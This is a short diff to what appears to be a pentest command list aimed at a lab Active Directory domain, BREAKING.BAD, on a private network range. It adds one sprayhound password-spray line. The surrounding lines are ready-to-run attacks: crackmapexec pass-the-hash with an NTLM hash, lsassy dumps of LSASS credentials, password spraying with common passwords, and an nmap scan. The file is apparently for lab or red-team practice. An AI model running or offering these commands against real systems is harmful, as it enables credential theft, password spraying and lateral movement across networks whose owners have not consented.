@@ -41,6 +41,7 @@ crackmapexec smb 192.168.56.0/24 --local-auth -u Administrator -H a88baa3fdc8f58
 crackmapexec smb 192.168.56.0/24 --local-auth -u Administrator -H a88baa3fdc8f581ee0fb05d7054d43e4 -M lsassy -o BLOODHOUND=True -o NEO4JUSER=neo4j -o NEO4JPASS=Somepassw0rd
 sprayhound -d BREAKING.BAD -dc DC01.BREAKING.BAD -lu anonymous -lp anonymous -p '123456'
 sprayhound -d BREAKING.BAD -dc DC01.BREAKING.BAD -lu anonymous -lp anonymous -p 'azerty'
+sprayhound -d BREAKING.BAD -dc DC01.BREAKING.BAD -lu anonymous -lp anonymous
 lsassy -u Administrator -H a88baa3fdc8f581ee0fb05d7054d43e4 192.168.56.0/24
 lsassy -d BREAKING.BAD -u Administrator -p 'passw0rd' 192.168.56.0/24
 nmap -Pn -sC -sV -T3 192.168.56.201
